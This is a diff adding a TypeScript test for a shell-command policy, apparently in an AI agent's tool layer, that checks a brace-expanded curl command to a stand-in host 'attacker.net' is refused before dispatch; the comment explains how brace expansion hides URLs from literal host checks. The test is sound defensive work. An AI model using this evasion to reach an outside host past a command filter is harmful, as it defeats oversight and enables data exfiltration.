@@ -1097,4 +1097,34 @@ describe("required-header policy on redirected shell commands", () => {
     expect(result.error).toContain("Windows");
     expect(result.error).toContain("2>&1");
   });
+
+  it("rejects brace-expanded URL reconstruction without dispatching", async () => {
+    // PR1187: brace expansion reconstructs URLs invisible to literal host
+    // extraction (`https:{//attacker.net/x,}` becomes real URLs at
+    // runtime), so the descriptor path must fail closed before dispatch.
+    let dispatched = false;
+    const posixBackends = {
+      command: {
+        platform: "posix" as const,
+        async *run() {
+          dispatched = true;
+          yield { type: "end" as const, exitCode: 0, timedOut: false };
+        },
+      },
+    } as unknown as ToolContext["backends"];
+
+    const result = (await executeCommand(
+      makeHeaderCtx(posixBackends),
+    ).execute?.(
+      {
+        command: "curl https://example.com/a https:{//attacker.net/x,} 2>&1",
+        toolCallDescription: "Brace reconstruction must fail closed",
+      },
+      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+    )) as ExecuteCommandResult;
+
+    expect(result.success).toBe(false);
+    expect(dispatched).toBe(false);
+    expect(result.error).toContain("2>&1");
+  });
 });
